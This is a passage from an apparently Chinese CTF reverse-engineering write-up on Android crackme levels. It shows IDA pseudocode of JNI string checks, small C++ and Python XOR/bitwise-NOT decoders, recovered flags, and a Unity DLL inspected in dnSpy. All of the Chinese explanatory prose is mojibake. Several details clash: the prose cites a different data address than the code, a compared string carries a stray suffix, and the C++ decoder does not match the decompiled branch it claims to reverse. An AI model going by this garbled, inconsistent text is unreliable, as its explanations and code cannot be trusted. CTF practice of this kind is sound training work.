class="hljs-keyword">while</span> ( v10 != v26 );<br>      <span class="hljs-keyword">if</span> ( v8 != v10 )<br>        <span class="hljs-keyword">goto</span> LABEL_7;<br>LABEL_11:<br>      v9[v8] = <span class="hljs-number">0</span>;<br>      v13 = <span class="hljs-built_in">memcmp</span>(v9, <span class="hljs-string">&quot;U_RTH&#125;\\Dlj\\Flx]\\Dl&#125;RGZEVlWJ]R^ZPlAVTZ@GARGZ\\]Ncovariant return thunk to &quot;</span>, v8) == <span class="hljs-number">0</span>;<br>      v14 = (*(__int64 (__fastcall **)(__int64, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_QWORD *)a1 + <span class="hljs-number">48LL</span>))(a1, <span class="hljs-string">&quot;java/lang/Boolean&quot;</span>);<br>      v15 = v14;<br>      v16 = (*(__int64 (__fastcall **)(__int64, __int64, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_QWORD *)a1 + <span class="hljs-number">264LL</span>))(<br>              a1,<br>              v14,<br>              <span class="hljs-string">&quot;&lt;init&gt;&quot;</span>,<br>              <span class="hljs-string">&quot;(Z)V&quot;</span>);<br>      v5 = _JNIEnv::NewObject(a1, v15, v16, v13, v17, v18, v27);<br>      (*(<span class="hljs-type">void</span> (__fastcall **)(__int64, __int64, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_QWORD *)a1 + <span class="hljs-number">1360LL</span>))(a1, a3, v7);<br>      operator delete[](v9);<br>      <span class="hljs-keyword">return</span> v5;<br>    &#125;<br>    v10 = v8 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFE0</span>LL;<br>    v20 = (((v8 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFE0</span>LL) - <span class="hljs-number">32</span>) &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( (v8 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFE0</span>LL) == <span class="hljs-number">32</span> )<br>    &#123;<br>      v22 = <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">if</span> ( (v20 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_20;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v21 = v20 &amp; <span class="hljs-number">0xFFFFFFFFFFFFFFFE</span>LL;<br>      v22 = <span class="hljs-number">0LL</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v23 = _mm_xor_ps(*(__m128 *)&amp;v7[v22 + <span class="hljs-number">16</span>], (__m128)xmmword_CA80);<br>        *(__m128 *)&amp;v9[v22] = _mm_xor_ps(*(__m128 *)&amp;v7[v22], (__m128)xmmword_CA80);<br>        *(__m128 *)&amp;v9[v22 + <span class="hljs-number">16</span>] = v23;<br>        v24 = _mm_xor_ps(*(__m128 *)&amp;v7[v22 + <span class="hljs-number">48</span>], (__m128)xmmword_CA80);<br>        *(__m128 *)&amp;v9[v22 + <span class="hljs-number">32</span>] = _mm_xor_ps(*(__m128 *)&amp;v7[v22 + <span class="hljs-number">32</span>], (__m128)xmmword_CA80);<br>        *(__m128 *)&amp;v9[v22 + <span class="hljs-number">48</span>] = v24;<br>        v22 += <span class="hljs-number">64LL</span>;<br>        v21 -= <span class="hljs-number">2LL</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v21 );<br>      <span class="hljs-keyword">if</span> ( (v20 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_20;<br>    &#125;<br>    v25 = _mm_xor_ps(*(__m128 *)&amp;v7[v22 + <span class="hljs-number">16</span>], (__m128)xmmword_CA80);<br>    *(__m128 *)&amp;v9[v22] = _mm_xor_ps(*(__m128 *)&amp;v7[v22], (__m128)xmmword_CA80);<br>    *(__m128 *)&amp;v9[v22 + <span class="hljs-number">16</span>] = v25;<br>LABEL_20:<br>    <span class="hljs-keyword">if</span> ( v8 == v10 )<br>      <span class="hljs-keyword">goto</span> LABEL_11;<br>    <span class="hljs-keyword">if</span> ( (v8 &amp; <span class="hljs-number">0x18</span>) == <span class="hljs-number">0</span> )<br>      <span class="hljs-keyword">goto</span> LABEL_7;<br>    <span class="hljs-keyword">goto</span> LABEL_22;<br>  &#125;<br>  <span class="hljs-keyword">return</span> v5;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä»£ç ä¸»è¦æµç¨‹ä¸ºï¼šå¯¹å­—ç¬¦ä¸² <code>v6</code> è¿›è¡Œå¼‚æˆ–ï¼Œåˆ†ä¸ºå‡ ç§æƒ…å†µï¼š</p><ul><li>å¦‚æœå­—ç¬¦ä¸²é•¿åº¦å°äº 8ï¼Œé€å­—èŠ‚è¿›è¡Œå¼‚æˆ–ï¼Œæ¯ä¸ªå­—ç¬¦éƒ½ä¸ <code>0x33</code> å¼‚æˆ–</li><li>å¦‚æœé•¿åº¦åœ¨ 8 ~ 32 ä¹‹é—´ï¼ŒæŒ‰ 8 å­—èŠ‚ä¸ºä¸€ç»„è¿›è¡Œå¼‚æˆ–ï¼Œå¼‚æˆ–å€¼æ˜¯ <code>0x3333333333333333LL</code></li><li>å¦‚æœé•¿åº¦è¶…è¿‡ 32 å­—èŠ‚ï¼Œä½¿ç”¨ <strong>SSE æŒ‡ä»¤</strong>ï¼ˆ<code>_mm_xor_ps</code>ï¼‰ï¼Œæ¯æ¬¡å¤„ç† 16 å­—èŠ‚ï¼Œç”¨ä¸€ä¸ªå…¨å±€å¸¸é‡ <code>xmmword_CA80</code> è¿›è¡Œå¼‚æˆ–</li></ul><p>è§£ç åçš„å­—ç¬¦ä¸²ä¼šä¸ä¸€ä¸ªå›ºå®šå­—ç¬¦ä¸² <code>U_RTH&#125;\\Dlj\\Flx]\\Dl&#125;RGZEVlWJ]R^ZPlAVTZ@GARGZ\\]Ncovariant return thunk to</code> è¿›è¡Œæ¯”è¾ƒï¼Œç›¸ç­‰åˆ™æ­£ç¡®ï¼Œexp å¦‚ä¸‹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;stdafx.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstring&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;immintrin.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cstdint&gt;</span></span><br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">decode</span><span class="hljs-params">(<span class="hljs-type">char</span>* encoded, <span class="hljs-type">size_t</span> length)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (length &lt; <span class="hljs-number">8</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            encoded[i] ^= <span class="hljs-number">0x33</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (length &lt; <span class="hljs-number">32</span>) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; length; i += <span class="hljs-number">8</span>) &#123;<br>            <span class="hljs-type">uint64_t</span>* block = <span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">uint64_t</span>*&gt;(encoded + i);<br>            *block ^= <span class="hljs-number">0x3333333333333333LL</span>;<br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">size_t</span> i = <span class="hljs-number">0</span>; i &lt; length; ++i) &#123;<br>            encoded[i] ^= <span class="hljs-number">0x33</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-type">const</span> <span class="hljs-type">char</span>* originalEncodedString = <span class="hljs-string">&quot;U_RTH&#125;\\Dlj\\Flx]\\Dl&#125;RGZEVlWJ]R^ZPlAVTZ@GARGZ\\]Ncovariant return thunk to&quot;</span>;<br>    <span class="hljs-type">size_t</span> length = <span class="hljs-built_in">strlen</span>(originalEncodedString);<br><br>    <span class="hljs-comment">// åŠ¨æ€åˆ†é…å†…å­˜ï¼Œé˜²æ­¢æ ˆæº¢å‡º</span><br>    <span class="hljs-type">char</span>* encodedString = <span class="hljs-keyword">new</span> <span class="hljs-type">char</span>[length + <span class="hljs-number">1</span>];<br>    <span class="hljs-built_in">strcpy</span>(encodedString, originalEncodedString);<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;åŠ å¯†å­—ç¬¦ä¸²: &quot;</span> &lt;&lt; encodedString &lt;&lt; std::endl;<br><br>    <span class="hljs-built_in">decode</span>(encodedString, length);<br><br>    std::cout &lt;&lt; <span class="hljs-string">&quot;è§£å¯†åçš„å­—ç¬¦ä¸²: &quot;</span> &lt;&lt; encodedString &lt;&lt; std::endl;<br><br>    <span class="hljs-comment">// é‡Šæ”¾åŠ¨æ€åˆ†é…çš„å†…å­˜</span><br>    <span class="hljs-keyword">delete</span>[] encodedString;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://img.dkdun.cn/v1/2025/12/e02ce8479e10fbfa.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;Now_You_Know_Native_dynamic_registration&#125;<br></code></pre></td></tr></table></figure><h1 id="åŠ¨æ€æ³¨å†Œ-level4"><a href="#åŠ¨æ€æ³¨å†Œ-level4" class="headerlink" title="åŠ¨æ€æ³¨å†Œ-level4"></a><strong>åŠ¨æ€æ³¨å†Œ</strong>-level4</h1><p>åŠ¨æ€æ³¨å†Œçš„æ–¹æ³•ä¸€èˆ¬æ¥è¯´éœ€è¦åˆ†æ <code>JNI_OnLoad</code> å‡½æ•°ï¼ŒæŠŠ <code>libsummertrain.so</code> ä¸¢è¿› idaåˆ†æ</p><p><img src="https://img.dkdun.cn/v1/2025/12/5c77e2e9e0f3031a.png"></p><p>emmmmmï¼Œè¿™é‡Œæˆ‘ä¼¼ä¹æ²¡åˆ†æå‡ºä»€ä¹ˆæ¥ï¼Œç„¶åçœ‹äº†çœ¼å…¶ä»–å‡½æ•°ï¼Œå‘ç°äº† <code>sub_172E0</code> å‡½æ•°æœ‰ä¸œè¥¿</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">sub_110B0</span><span class="hljs-params">(<span class="hljs-type">int</span> a1, <span class="hljs-type">int</span> a2, <span class="hljs-type">int</span> a3)</span><br>&#123;<br>    ...<br>  v3 = (<span class="hljs-type">const</span> <span class="hljs-type">char</span> *)(*(<span class="hljs-type">int</span> (__cdecl **)(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, _DWORD))(*(_DWORD *)a1 + <span class="hljs-number">676</span>))(a1, a3, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">if</span> ( v3 )<br>  &#123;<br>    v4 = (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v3;<br>    v5 = <span class="hljs-built_in">strlen</span>(v3);<br>    v6 = (_BYTE *)operator new[](v5 + <span class="hljs-number">1</span>);<br>    v7 = v5;<br>    v8 = v6;<br>    <span class="hljs-keyword">if</span> ( !v7 )<br>      <span class="hljs-keyword">goto</span> LABEL_21;<br>    v9 = <span class="hljs-number">0</span>;<br>    v24 = v7;<br>    <span class="hljs-keyword">if</span> ( v7 &lt; <span class="hljs-number">8</span> || (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)v8 &lt; v4 + v7 &amp;&amp; v4 &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)&amp;v8[v7] )<br>      <span class="hljs-keyword">goto</span> LABEL_17;<br>    v9 = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> ( v7 &lt; <span class="hljs-number">0x20</span> )<br>    &#123;<br>LABEL_14:<br>      v17 = v9;<br>      v9 = v7 &amp; <span class="hljs-number">0xFFFFFFF8</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        *(_QWORD *)&amp;v8[v17] = _mm_xor_si128(_mm_loadl_epi64((<span class="hljs-type">const</span> __m128i *)(v4 + v17)), (__m128i)<span class="hljs-number">-1LL</span>).m128i_u64[<span class="hljs-number">0</span>];<br>        v17 += <span class="hljs-number">8</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v9 != v17 );<br>      <span class="hljs-keyword">if</span> ( v7 != v9 )<br>        <span class="hljs-keyword">goto</span> LABEL_17;<br>LABEL_21:<br>      v8[v7] = <span class="hljs-number">0</span>;<br>      v25 = <span class="hljs-built_in">memcmp</span>(v8, &amp;unk_78FD, v7) == <span class="hljs-number">0</span>;<br>      v20 = (*(<span class="hljs-type">int</span> (__cdecl **)(<span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_DWORD *)a1 + <span class="hljs-number">24</span>))(a1, <span class="hljs-string">&quot;java/lang/Boolean&quot;</span>);<br>      v21 = (*(<span class="hljs-type">int</span> (__cdecl **)(<span class="hljs-type">int</span>, <span class="hljs-type">int</span>, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *))(*(_DWORD *)a1 + <span class="hljs-number">132</span>))(a1, v20, <span class="hljs-string">&quot;&lt;init&gt;&quot;</span>, <span class="hljs-string">&quot;(Z)V&quot;</span>);<br>      v22 = _JNIEnv::NewObject(a1, v20, v21, v25);<br>      (*(<span class="hljs-type">void</span> (__cdecl **)(<span class="hljs-type">int</span>))(*(_DWORD *)a1 + <span class="hljs-number">680</span>))(a1);<br>      operator delete[](v8);<br>      <span class="hljs-keyword">return</span> v22;<br>    &#125;<br>    v9 = v7 &amp; <span class="hljs-number">0xFFFFFFE0</span>;<br>    v10 = (v7 &amp; <span class="hljs-number">0xFFFFFFE0</span>) - <span class="hljs-number">32</span>;<br>    v11 = (v10 &gt;&gt; <span class="hljs-number">5</span>) + <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">if</span> ( v10 )<br>    &#123;<br>      v12 = v11 &amp; <span class="hljs-number">0xFFFFFFFE</span>;<br>      v13 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">do</span><br>      &#123;<br>        v14 = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)(v4 + v13 + <span class="hljs-number">16</span>)), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v13] = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)(v4 + v13)), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v13 + <span class="hljs-number">16</span>] = v14;<br>        v15 = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)(v4 + v13 + <span class="hljs-number">48</span>)), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v13 + <span class="hljs-number">32</span>] = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)(v4 + v13 + <span class="hljs-number">32</span>)), (__m128i)<span class="hljs-number">-1LL</span>);<br>        *(__m128i *)&amp;v8[v13 + <span class="hljs-number">48</span>] = v15;<br>        v13 += <span class="hljs-number">64</span>;<br>        v12 -= <span class="hljs-number">2</span>;<br>      &#125;<br>      <span class="hljs-keyword">while</span> ( v12 );<br>      <span class="hljs-keyword">if</span> ( (v11 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_12;<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>      v13 = <span class="hljs-number">0</span>;<br>      <span class="hljs-keyword">if</span> ( (v11 &amp; <span class="hljs-number">1</span>) == <span class="hljs-number">0</span> )<br>        <span class="hljs-keyword">goto</span> LABEL_12;<br>    &#125;<br>    v16 = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)(v4 + v13 + <span class="hljs-number">16</span>)), (__m128i)<span class="hljs-number">-1LL</span>);<br>    *(__m128i *)&amp;v8[v13] = _mm_xor_si128(_mm_loadu_si128((<span class="hljs-type">const</span> __m128i *)(v4 + v13)), (__m128i)<span class="hljs-number">-1LL</span>);<br>    *(__m128i *)&amp;v8[v13 + <span class="hljs-number">16</span>] = v16;<br>LABEL_12:<br>    v7 = v24;<br>    <span class="hljs-keyword">if</span> ( v24 == v9 )<br>      <span class="hljs-keyword">goto</span> LABEL_21;<br>    <span class="hljs-keyword">if</span> ( (v24 &amp; <span class="hljs-number">0x18</span>) == <span class="hljs-number">0</span> )<br>    &#123;<br>LABEL_17:<br>      v18 = v7 + ~v9;<br>      <span class="hljs-keyword">for</span> ( i = v7 &amp; <span class="hljs-number">3</span>; i; --i )<br>      &#123;<br>        v8[v9] = ~*(_BYTE *)(v4 + v9);<br>        ++v9;<br>      &#125;<br>      v7 = v24;<br>      <span class="hljs-keyword">if</span> ( v18 &gt;= <span class="hljs-number">3</span> )<br>      &#123;<br>        <span class="hljs-keyword">do</span><br>        &#123;<br>          v8[v9] = ~*(_BYTE *)(v4 + v9);<br>          v8[v9 + <span class="hljs-number">1</span>] = ~*(_BYTE *)(v4 + v9 + <span class="hljs-number">1</span>);<br>          v8[v9 + <span class="hljs-number">2</span>] = ~*(_BYTE *)(v4 + v9 + <span class="hljs-number">2</span>);<br>          v8[v9 + <span class="hljs-number">3</span>] = ~*(_BYTE *)(v4 + v9 + <span class="hljs-number">3</span>);<br>          v9 += <span class="hljs-number">4</span>;<br>        &#125;<br>        <span class="hljs-keyword">while</span> ( v24 != v9 );<br>      &#125;<br>      <span class="hljs-keyword">goto</span> LABEL_21;<br>    &#125;<br>    <span class="hljs-keyword">goto</span> LABEL_14;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>é¦–å…ˆç”¨ <code>v5</code> å­˜å‚¨è°ƒç”¨ <code>(*(_QWORD *)a1 + 1352LL)</code> æ‰€è¿”å›çš„å­—ç¬¦ä¸²ï¼Œ<code>v6</code> æŒ‡å‘æŒ‡å‘ <code>v5</code>ï¼Œç„¶å <code>v8</code>æ¥å­˜å‚¨å­—ç¬¦ä¸²</p><p>è€Œä¸”ä»£ç æ ¹æ®å­—ç¬¦ä¸²é•¿åº¦è¿›è¡Œä¸åŒçš„è§£å¯†å¤„ç†ï¼š</p><ul><li><strong>é•¿åº¦å°äº 8 çš„æƒ…å†µ</strong>ï¼Œé€å­—èŠ‚è¿›è¡ŒæŒ‰ä½<strong>å–å</strong></li><li><strong>é•¿åº¦å¤§äºæˆ–ç­‰äº 8 å°äº 32 çš„æƒ…å†µ</strong>ï¼Œåˆ©ç”¨ <strong><code>_mm_xor_si128</code></strong> è¿›è¡Œ 8 å­—èŠ‚ä¸ºå•ä½çš„æ‰¹é‡è§£å¯†</li><li><strong>é•¿åº¦å¤§äºæˆ–ç­‰äº 32 çš„æƒ…å†µ</strong>ï¼Œä¸€æ¬¡å¤„ç† 64 å­—èŠ‚<ul><li>**<code>_mm_xor_si128</code>**ï¼šé€šè¿‡å‘é‡åŒ–æ“ä½œï¼Œå°† 16 å­—èŠ‚æ•°æ®ä¸ <code>-1</code> è¿›è¡Œå¼‚æˆ–ï¼Œç›¸å½“äºæ¯ä¸ªå­—èŠ‚éƒ½æ‰§è¡Œ <code>~</code> æ“ä½œï¼ˆæŒ‰ä½å–åï¼‰</li></ul></li></ul><p>ä»£ç ä¸­æœ‰ä¸€å¥ <code>v12 = memcmp(v8, &amp;unk_DCF0, v7) == 0</code>ï¼Œä¸»è¦ä½œç”¨æ˜¯é€šè¿‡ <strong><code>memcmp</code></strong> å‡½æ•°æ¯”è¾ƒä¸¤ä¸ªå†…å­˜åŒºåŸŸçš„å†…å®¹æ˜¯å¦ç›¸ç­‰ï¼Œé‚£ä¹ˆ <code>v5</code> ä¸­çš„å­—ç¬¦ä¸²å°±å­˜å‚¨åœ¨ <code>unk_DCF0</code> ä¸­ï¼Œæå–å‡ºæ¥</p><p><img src="https://img.dkdun.cn/v1/2025/12/52d5d49ec7b27e07.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">0x99</span>, <span class="hljs-number">0</span>x93, <span class="hljs-number">0</span>x9E, <span class="hljs-number">0</span>x98, <span class="hljs-number">0</span>x84, <span class="hljs-number">0</span>xB1, <span class="hljs-number">0</span>x90, <span class="hljs-number">0</span>x88, <span class="hljs-number">0</span>xA0, <span class="hljs-number">0</span>xA6, <span class="hljs-number">0</span>x90, <span class="hljs-number">0</span>x8A, <span class="hljs-number">0</span>xA0, <span class="hljs-number">0</span>xB4, <span class="hljs-number">0</span>x91, <span class="hljs-number">0</span>x90, <span class="hljs-number">0</span>x88, <span class="hljs-number">0</span>xA0, <span class="hljs-number">0</span>xB1, <span class="hljs-number">0</span>x9E, <span class="hljs-number">0</span>x8B, <span class="hljs-number">0</span>x96, <span class="hljs-number">0</span>x89, <span class="hljs-number">0</span>x9A, <span class="hljs-number">0</span>xA0, <span class="hljs-number">0</span>x8D, <span class="hljs-number">0</span>x9A, <span class="hljs-number">0</span>x9E, <span class="hljs-number">0</span>x93, <span class="hljs-number">0</span>xA0, <span class="hljs-number">0</span>x9B, <span class="hljs-number">0</span>x86, <span class="hljs-number">0</span>x91, <span class="hljs-number">0</span>x9E, <span class="hljs-number">0</span>x92, <span class="hljs-number">0</span>x96, <span class="hljs-number">0</span>x9C, <span class="hljs-number">0</span>xA0, <span class="hljs-number">0</span>x8D, <span class="hljs-number">0</span>x9A, <span class="hljs-number">0</span>x98, <span class="hljs-number">0</span>x96, <span class="hljs-number">0</span>x8C, <span class="hljs-number">0</span>x8B, <span class="hljs-number">0</span>x8D, <span class="hljs-number">0</span>x9E, <span class="hljs-number">0</span>x8B, <span class="hljs-number">0</span>x96, <span class="hljs-number">0</span>x90, <span class="hljs-number">0</span>x91, <span class="hljs-number">0</span>x82<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">ida_chars = [<br>    <span class="hljs-number">0x99</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xA6</span>,<br>    <span class="hljs-number">0x90</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x9E</span>,<br>    <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0xA0</span>,<br>    <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9A</span>,<br>    <span class="hljs-number">0x98</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x91</span>,<br>    <span class="hljs-number">0x82</span><br>]<br><br>decrypted_string = <span class="hljs-string">&#x27;&#x27;</span>.join(<span class="hljs-built_in">chr</span>(~byte &amp; <span class="hljs-number">0xFF</span>) <span class="hljs-keyword">for</span> byte <span class="hljs-keyword">in</span> ida_chars)<br><span class="hljs-built_in">print</span>(decrypted_string)<br><br></code></pre></td></tr></table></figure><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;Now_You_Know_Native_real_dynamic_registration&#125;<br></code></pre></td></tr></table></figure><h1 id="GAME-level5"><a href="#GAME-level5" class="headerlink" title="GAME-level5"></a>GAME-level5</h1><p>Jeb æ‰“å¼€å‘ç°äº†å…³äº Unity çš„ä¸œè¥¿ï¼ŒçŒœæµ‹è¿™ä¸ªç¨‹åºä¼°è®¡æ˜¯ç”¨ Unity å†™çš„</p><p><img src="https://img.dkdun.cn/v1/2025/12/f1df02fcb69e0554.png"></p><p>æŠŠ <code>\assets\bin\Data\Managed\</code> ä¸‹çš„ <code>Assembly-CSharp.dll</code>  æ–‡ä»¶ä¸¢è¿› dnSpy çœ‹çœ‹ï¼Œåœ¨ <code>GameWindow</code> æ‰¾åˆ° flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/336e506c9ec7a7de.png"></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cmd">flag&#123;justaeasyunitygame&#125;<br></code></pre></td></tr></table></figure><h1 id="GAME-level6"><a 